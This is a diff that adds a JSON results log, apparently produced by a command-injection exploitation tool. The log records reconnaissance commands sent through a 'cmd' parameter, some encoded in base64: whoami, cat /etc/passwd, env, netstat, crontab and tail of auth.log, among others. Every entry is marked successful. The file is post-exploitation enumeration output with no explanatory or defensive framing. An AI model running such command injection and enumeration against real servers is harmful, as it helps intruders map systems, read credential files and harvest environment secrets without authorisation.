@@ -1,0 +1,331 @@
+{
+  "system_info": [
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "whoami",
+      "response_length": 85104,
+      "response_time": 0.5943148136138916,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "id",
+      "response_length": 85104,
+      "response_time": 0.2205066680908203,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "groups",
+      "response_length": 85104,
+      "response_time": 0.21882867813110352,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "cat /etc/passwd",
+      "response_length": 85104,
+      "response_time": 0.21968579292297363,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "cat /etc/group",
+      "response_length": 85104,
+      "response_time": 0.2177889347076416,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "cat /proc/version",
+      "response_length": 85104,
+      "response_time": 0.22130465507507324,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "cat /etc/os-release",
+      "response_length": 85104,
+      "response_time": 0.21812820434570312,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "uname -r",
+      "response_length": 85104,
+      "response_time": 0.21943116188049316,
+      "status_code": 200
+    }
+  ],
+  "network_info": [
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "ifconfig",
+      "response_length": 85104,
+      "response_time": 0.22193074226379395,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "ip addr",
+      "response_length": 85104,
+      "response_time": 0.2214806079864502,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "netstat -tulpn",
+      "response_length": 85104,
+      "response_time": 0.22015380859375,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "route -n",
+      "response_length": 85104,
+      "response_time": 0.22412323951721191,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "cat /etc/resolv.conf",
+      "response_length": 85104,
+      "response_time": 0.22253084182739258,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "hostname -I",
+      "response_length": 85104,
+      "response_time": 0.22232294082641602,
+      "status_code": 200
+    }
+  ],
+  "process_info": [
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "ps aux",
+      "response_length": 85104,
+      "response_time": 0.22299790382385254,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "top -bn1",
+      "response_length": 85104,
+      "response_time": 0.22238922119140625,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "pstree",
+      "response_length": 85104,
+      "response_time": 0.21903395652770996,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "systemctl list-units --type=service",
+      "response_length": 85104,
+      "response_time": 0.221480131149292,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "service --status-all",
+      "response_length": 85104,
+      "response_time": 0.22225499153137207,
+      "status_code": 200
+    }
+  ],
+  "file_system": [
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "df -h",
+      "response_length": 85104,
+      "response_time": 0.21895313262939453,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "mount",
+      "response_length": 85104,
+      "response_time": 0.2193772792816162,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "cat /proc/mounts",
+      "response_length": 85104,
+      "response_time": 0.22439193725585938,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "lsblk",
+      "response_length": 85104,
+      "response_time": 0.22250986099243164,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "fdisk -l",
+      "response_length": 85104,
+      "response_time": 0.2224745750427246,
+      "status_code": 200
+    }
+  ],
+  "environment": [
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "env",
+      "response_length": 85104,
+      "response_time": 0.2196190357208252,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "printenv",
+      "response_length": 85104,
+      "response_time": 0.2168729305267334,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "set",
+      "response_length": 85104,
+      "response_time": 0.22001099586486816,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "ulimit -a",
+      "response_length": 85104,
+      "response_time": 0.2198319435119629,
+      "status_code": 200
+    }
+  ],
+  "cron_jobs": [
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "crontab -l",
+      "response_length": 85104,
+      "response_time": 0.22518706321716309,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "base64",
+      "param": "cmd",
+      "command": "ls -la /etc/cron.*",
+      "response_length": 85104,
+      "response_time": 0.21895098686218262,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "cat /etc/crontab",
+      "response_length": 85104,
+      "response_time": 0.21950387954711914,
+      "status_code": 200
+    }
+  ],
+  "logs": [
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "tail -10 /var/log/syslog",
+      "response_length": 85104,
+      "response_time": 0.2223348617553711,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "direct",
+      "param": "cmd",
+      "command": "tail -10 /var/log/auth.log",
+      "response_length": 85104,
+      "response_time": 0.21920061111450195,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "base64",
+      "param": "cmd",
+      "command": "tail -10 /var/log/apache2/access.log",
+      "response_length": 85104,
+      "response_time": 0.23524951934814453,
+      "status_code": 200
+    },
+    {
+      "success": true,
+      "technique": "base64",
+      "param": "cmd",
+      "command": "tail -10 /var/log/nginx/access.log",
+      "response_length": 85104,
+      "response_time": 0.2184598445892334,
+      "status_code": 200
+    }
+  ]
+}
